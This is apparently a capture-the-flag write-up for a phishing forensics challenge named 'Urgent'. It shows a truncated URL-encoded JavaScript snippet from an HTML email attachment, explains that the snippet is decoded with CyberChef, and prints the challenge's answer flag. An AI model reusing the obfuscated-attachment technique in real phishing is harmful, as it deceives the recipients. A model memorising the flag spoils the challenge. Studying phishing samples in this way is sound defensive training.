---
title: Urgent 
date: 2023-12-10T13:37:49+02:00
author: 1byteBoy
tags:
  - Forensics
draft: false
---

```
Urgent

In the midst of Cybercity's "Fray," a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions' destiny.
```

The zip file contains a .eml file. Opening or reading it with any .eml reader online or with any other application that reads .eml file, will give us a attachment named `onlineform.html`. 

Downling and reading the source of the file provides us with a url encoded string.

```
<html>                                                                                                                                               
<head>                                                                                                                                               
<title></title>
<body>
<script language="JavaScript" type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0d%0a%3c%68%65%61%64%3e%0d%0a%3c%74%69%74%6c%65%3e%20%3e%5f%20%3c%2f%74%69%74%6c%65%3e%0d%0a%3c%63%65%6e%74%65%72%3e%3c ........
```

which one decoding with online tools like https://gchq.github.io/CyberChef/, provides us the flag

```
$flag='HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}"
```
